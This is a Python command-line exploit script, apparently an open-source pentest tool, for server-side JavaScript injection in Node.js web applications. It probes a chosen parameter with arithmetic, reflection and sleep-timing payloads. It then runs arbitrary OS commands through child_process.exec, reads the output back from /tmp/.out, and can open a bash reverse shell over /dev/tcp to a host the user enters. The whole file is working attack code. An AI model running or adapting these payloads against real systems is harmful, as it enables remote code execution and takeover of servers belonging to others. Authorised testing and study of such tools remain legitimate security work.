#!/usr/bin/env python3
"""
NodeJS exploit

Copyright (c) 2020 Nicolas BÃ©guier
Licensed under the MIT License
Written by Nicolas BEGUIER (nicolas_beguier@hotmail.com)
"""

# Standard library imports
from argparse import ArgumentParser
import sys

# Third party library imports
import requests

# Debug
# from pdb import set_trace as st

VERSION = '1.1.0'

def get_headers(header_list):
    """
    Returns a dict of headers
    """
    headers = dict()
    headers['User-Agent'] = 'nodejs-exploit'
    for header in header_list:
        headers[header.split(':')[0]] = header.split()[1]
    return headers

def replace_qp_value(payload, key, value):
    """
    Replaces the given value of the query parameter
    """
    payload_split = payload.split('&')
    for i, query_p in enumerate(payload_split):
        if query_p.startswith(key+'='):
            payload_split[i] = key+'='+value
    return '&'.join(payload_split)

def check_command(req, resp_orig, params, command, check_name, display_output=True):
    """
    This function is comparing the injection command with the original request
    """
    if params['method'] == 'GET':
        url = params['url'].split('?')[0]
        query_ps = params['url'].split('?')[1]
        payload_0 = replace_qp_value(query_ps, params['param'], command)
        resp_0 = req(url+'?'+payload_0, headers=params['headers'])
    else:
        payload_0 = replace_qp_value(params['data'], params['param'], command)
        resp_0 = req(params['url'], data=payload_0, headers=params['headers'])
    if check_name.startswith('sleep') and resp_0.elapsed.total_seconds() > int(check_name.replace('sleep', '')):
        print('"{}" possible, seems vulnerable'.format(check_name))
    elif resp_0.ok:
        if resp_0.text != resp_orig.text:
            print('"{}" possible, seems vulnerable'.format(check_name))
            if display_output:
                print('Output: {}'.format(resp_0.text))
        else:
            print('No reflection with "{}"'.format(check_name))
    else:
        print('Error during "{}" test'.format(check_name))

def main(params):
    """
    Main function
    """
    headers = dict()
    headers.update(get_headers(params['headers']))
    params['headers'] = headers

    req = getattr(requests, params['method'].lower())
    resp_orig = req(params['url'], data=params['data'], headers=params['headers'])
    if not resp_orig.ok:
        print('Error during request: {}'.format(resp_orig.text))
        sys.exit(1)

    if params['checks']:
        # Add check
        if params['method'] == 'GET':
            url = params['url'].split('?')[0]
            query_ps = params['url'].split('?')[1]
            payload_add_0 = replace_qp_value(query_ps, params['param'], '2')
            payload_add_1 = replace_qp_value(query_ps, params['param'], '2%2b2')
            payload_add_2 = replace_qp_value(query_ps, params['param'], '4')
            resp_add_0 = req(url+'?'+payload_add_0, headers=params['headers'])
            resp_add_1 = req(url+'?'+payload_add_1, headers=params['headers'])
            resp_add_2 = req(url+'?'+payload_add_2, headers=params['headers'])
        else:
            payload_add_0 = replace_qp_value(params['data'], params['param'], '2')
            payload_add_1 = replace_qp_value(params['data'], params['param'], '2%2b2')
            payload_add_2 = replace_qp_value(params['data'], params['param'], '4')
            resp_add_0 = req(params['url'], data=payload_add_0, headers=params['headers'])
            resp_add_1 = req(params['url'], data=payload_add_1, headers=params['headers'])
            resp_add_2 = req(params['url'], data=payload_add_2, headers=params['headers'])
        if resp_add_0.ok and resp_add_1.ok and resp_add_2.ok:
            if resp_add_0.text != resp_add_1.text and \
                resp_add_1.text == resp_add_2.text:
                print('"add" possible, seems vulnerable')
            else:
                print('No reflection with "add"')
        else:
            print('Error during "add" test')

        check_command(req, resp_orig, params, 'isFinite()', 'isFinite', display_output=False)
        check_command(req, resp_orig, params, "res.end('hello')", 'hello')
        check_command(req, resp_orig, params, "res.end(require('fs').readdirSync('.').toString())", 'ls')
        check_command(req, resp_orig, params, params['param']+"';sleep(5000);'", 'sleep5')
        check_command(req, resp_orig, params, 'sleep(5000)', 'sleep5')

    if params['os-command']:
        check_command(req, resp_orig, params, "res.end(require('child_process').exec('{} > /tmp/.out').toString())".format(params['os-command']), 'OS command', display_output=False)
        check_command(req, resp_orig, params, "res.end(require('fs').readFileSync('/tmp/.out').toString())", 'Read Output')

    if params['reverse-shell']:
        host = input('[Reverse shell] Host: ')
        port = input('[Reverse shell] Port: ')
        check_command(req, resp_orig, params, "res.end(require('child_process').exec('bash+-c+\"bash+-i+>%26+/dev/tcp/{}/{}+0>%261\"').toString())".format(host, port), 'reverse shell', display_output=False)

if __name__ == '__main__':
    PARSER = ArgumentParser()

    PARSER.add_argument('--version', action='version', version=VERSION)
    PARSER.add_argument('-u', '--url', action='store',\
        help="URL to exploit")
    PARSER.add_argument('-H', '--headers', action='store', nargs='+', \
        help="headers", default=None)
    PARSER.add_argument('-p', action='store',\
        help="vulnerable parameter")
    PARSER.add_argument('-d', '--data', action='store',\
        help="data payload")
    PARSER.add_argument('-X', '--method', action='store',\
        help="request method", default='GET')
    PARSER.add_argument('--os-command', action='store',\
        help="custom os command")
    PARSER.add_argument('--reverse-shell', action='store_true',\
        help="run reverse shell", default=False)
    PARSER.add_argument('--disable-checks', action='store_true',\
        help="disable exploit checks", default=False)
    ARGS = PARSER.parse_args()

    PARAMS = dict()
    PARAMS['url'] = ARGS.url
    PARAMS['headers'] = ARGS.headers
    PARAMS['param'] = ARGS.p
    PARAMS['data'] = ARGS.data
    PARAMS['method'] = ARGS.method
    PARAMS['os-command'] = ARGS.os_command
    PARAMS['reverse-shell'] = ARGS.reverse_shell
    PARAMS['checks'] = not ARGS.disable_checks

    main(PARAMS)
